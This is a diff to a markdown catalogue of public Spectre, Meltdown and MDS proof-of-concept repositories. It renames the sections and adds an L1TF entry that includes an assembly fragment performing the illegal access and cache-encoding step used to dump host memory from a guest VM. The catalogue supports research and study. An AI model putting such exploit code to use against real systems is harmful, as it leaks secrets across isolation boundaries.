@@ -15,7 +15,7 @@ ToC:
   - [mniip/spectre-meltdown-poc](#mniipspectre-meltdown-poc)
   - [msmania/microarchitectural-attack](#msmaniamicroarchitectural-attack)
   - [adamalston/Meltdown-Spectre](#adamalstonmeltdown-spectre)
-- [Spectre](#spectre)
+- [Spectre-type](#spectre-type)
   - [ErikAugust/spectre.c](#erikaugustspectrec)
   - [lsds/spectre-attack-sgx](#lsdsspectre-attack-sgx)
   - [opsxcq/exploit-cve-2017-5715](#opsxcqexploit-cve-2017-5715)
@@ -24,13 +24,14 @@ ToC:
   - [HexHive/SMoTherSpectre](#hexhivesmotherspectre)
   - [mmxsrup/CVE-2018-3639](#mmxsrupcve-2018-3639)
   - [Shuiliusheng/CVE-2018-3639-specter-v4-](#shuiliushengcve-2018-3639-specter-v4-)
-- [Meltdown](#meltdown)
+- [Meltdown-type](#meltdown-type)
   - [IAIK/meltdown](#iaikmeltdown)
   - [feruxmax/meltdown](#feruxmaxmeltdown)
   - [Frichetten/meltdown-spectre-poc](#frichettenmeltdown-spectre-poc)
   - [paboldin/meltdown-exploit](#paboldinmeltdown-exploit)
   - [Semihalf/spectre-meltdown](#semihalfspectre-meltdown)
-- [MDS](#mds)
+  - [gregvish/l1tf-poc.git](#gregvishl1tf-pocgit)
+- [MDS-type](#mds-type)
   - [ZombieLoad](#zombieload)
   - [RIDL](#ridl)
 - [Related](#related)
@@ -72,7 +73,7 @@ Touch:
 ## adamalston/Meltdown-Spectre
 * Link: [https://github.com/adamalston/Meltdown-Spectre](https://github.com/adamalston/Meltdown-Spectre)
 
-# Spectre
+# Spectre-type
 ## ErikAugust/spectre.c
 * Link: [https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6](https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6)
 * Description: Original C Source
@@ -182,7 +183,7 @@ void victim_function(size_t idx) {
 }
 ```
 
-# Meltdown
+# Meltdown-type
 ## IAIK/meltdown
 * Link: [https://github.com/IAIK/meltdown.git](https://github.com/IAIK/meltdown.git)
 * Description: Discloser.
@@ -257,7 +258,39 @@ __attribute__((noinline)) uint8_t bounds_check(uint64_t idx)
 }
 ```
 
-# MDS
+## gregvish/l1tf-poc.git
+* Link: [https://github.com/gregvish/l1tf-poc.git](https://github.com/gregvish/l1tf-poc.git)
+* Tool: C, ASM
+* Description: Its README explains the concerns to run the PoC, dumping host memory in a guest. The PoC should run on a VM which is compromised by specific codes. It is necessary to break the mapping of the VM to physical address, which may use a brute force method. It mentions that L1TF succeeds to capture secrets in L1 DCache. Otherwise, no meaningful data will be inferred. 
+
+```asm
+do_access:
+    push %rbx
+    push %rdi
+    push %rsi
+    push %rdx
+
+    // Do the illegal access (rdx is ptr param)
+    movb (%rdx), %bl
+    // Duplicate result to rax
+    mov %rbx, %rax
+
+    // calculate our_buffer_lsb offset according to low nibble
+    and $0xf, %rax
+    shl $0xc, %rax
+
+    // calculate our_buffer_msb offset according to high nibble
+    shr $0x4, %rbx
+    and $0xf, %rbx
+    shl $0xc, %rbx
+
+    // rsi is our_buffer_lsb param
+    mov (%rsi, %rax, 1), %rax
+    // rdi is our_buffer_msb param
+    mov (%rdi, %rbx, 1), %rbx
+```
+
+# MDS-type
 ## ZombieLoad
 * Link: [https://github.com/IAIK/ZombieLoad.git](https://github.com/IAIK/ZombieLoad.git)
 
